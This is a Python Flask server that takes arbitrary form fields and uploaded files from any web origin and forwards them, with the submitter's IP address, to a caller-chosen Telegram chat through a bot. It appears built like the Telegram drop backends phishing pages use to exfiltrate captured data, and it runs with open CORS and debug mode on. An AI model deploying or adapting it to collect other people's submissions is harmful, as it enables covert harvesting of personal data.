import os
import time
import requests
import logging
from threading import Thread
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# 🔧 Max upload size
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not set")

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"


# ================= TELEGRAM SEND WITH RETRY =================
def send_telegram(url, data=None, files=None, retries=3):
    for i in range(retries):
        try:
            res = requests.post(
                url,
                json=data if not files else None,
                data=data if files else None,
                files=files,
                timeout=20
            )

            if res.ok:
                return True

        except Exception as e:
            logging.error(f"Attempt {i+1} failed: {e}")

        time.sleep(2)

    return False


# ================= HOME =================
@app.route("/", methods=["GET"])
def home():
    return "Server running"


# ================= MAIN ROUTE =================
@app.route("/send", methods=["POST"])
def send():
    try:
        chat_id = request.form.get("chat_id")

        if not chat_id:
            return jsonify({"ok": False, "error": "chat_id missing"}), 400

        if not request.content_length or request.content_length == 0:
            return jsonify({"ok": False, "error": "Empty request"}), 400

        logging.info("REQUEST RECEIVED")

        # ✅ Validate files
        for key in request.files:
            file = request.files[key]
            if not file or file.filename == "":
                return jsonify({
                    "ok": False,
                    "error": f"Incomplete file upload: {key}"
                }), 400

        # ✅ Clone data
        form_data = request.form.to_dict(flat=False)

        files = {}
        for k in request.files:
            f = request.files[k]
            files[k] = {
                "filename": f.filename,
                "content": f.read(),
                "content_type": f.content_type
            }

        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

        # 🚀 Background processing
        Thread(target=process_telegram, args=(chat_id, form_data, files, user_ip)).start()

        return jsonify({
            "ok": True,
            "message": "Upload complete"
        })

    except Exception as e:
        logging.exception("Error:")
        return jsonify({"ok": False, "error": str(e)}), 500


# ================= BACKGROUND =================
def process_telegram(chat_id, form_data, files, user_ip):
    try:
        logging.info("BACKGROUND STARTED")

        failed_items = []

        # ================= BUILD TEXT =================
        text_lines = [
            "📱 New Submission",
            f"🌐 IP: {user_ip}",
            ""
        ]

        # ✅ FIX: Read ALL form fields dynamically
        for key, values in form_data.items():
            for value in values:
                try:
                    safe_key = str(key).encode("utf-8", "ignore").decode()
                    safe_value = str(value).encode("utf-8", "ignore").decode()
                    text_lines.append(f"{safe_key}: {safe_value}")
                except:
                    text_lines.append(f"{key}: [unreadable]")

        full_text = "\n".join(text_lines)

        # ================= SEND TEXT =================
        if len(full_text) <= 4096:
            ok = send_telegram(
                f"{TG_API}/sendMessage",
                data={"chat_id": chat_id, "text": full_text}
            )

            if not ok:
                failed_items.append({
                    "type": "text",
                    "content": full_text
                })

        else:
            parts = [full_text[i:i+4000] for i in range(0, len(full_text), 4000)]

            for part in parts:
                ok = send_telegram(
                    f"{TG_API}/sendMessage",
                    data={"chat_id": chat_id, "text": part}
                )

                if not ok:
                    failed_items.append({
                        "type": "text_part",
                        "content": part
                    })

        # ================= SEND FILES =================
        for key in files:
            file = files[key]

            ok = send_telegram(
                f"{TG_API}/sendDocument",
                data={"chat_id": chat_id},
                files={
                    "document": (
                        file["filename"],
                        file["content"],
                        file["content_type"]
                    )
                }
            )

            if not ok:
                failed_items.append({
                    "type": "file",
                    "file": file
                })

        # ================= RETRY FAILED ONLY =================
        if failed_items:
            logging.warning(f"Retrying {len(failed_items)} failed items...")

            time.sleep(3)

            for item in failed_items:
                if item["type"] == "text":
                    send_telegram(
                        f"{TG_API}/sendMessage",
                        data={"chat_id": chat_id, "text": item["content"]}
                    )

                elif item["type"] == "text_part":
                    send_telegram(
                        f"{TG_API}/sendMessage",
                        data={"chat_id": chat_id, "text": item["content"]}
                    )

                elif item["type"] == "file":
                    file = item["file"]
                    send_telegram(
                        f"{TG_API}/sendDocument",
                        data={"chat_id": chat_id},
                        files={
                            "document": (
                                file["filename"],
                                file["content"],
                                file["content_type"]
                            )
                        }
                    )

        logging.info("BACKGROUND DONE")

    except Exception as e:
        logging.error(f"Background error: {e}")


# ================= ERRORS =================
@app.errorhandler(413)
def too_large(e):
    return jsonify({
        "ok": False,
        "error": "File too large (max 50MB)"
    }), 413


@app.errorhandler(Exception)
def handle_exception(e):
    logging.exception("Unhandled:")
    return jsonify({
        "ok": False,
        "error": str(e)
    }), 500


if __name__ == "__main__":
    app.run(debug=True)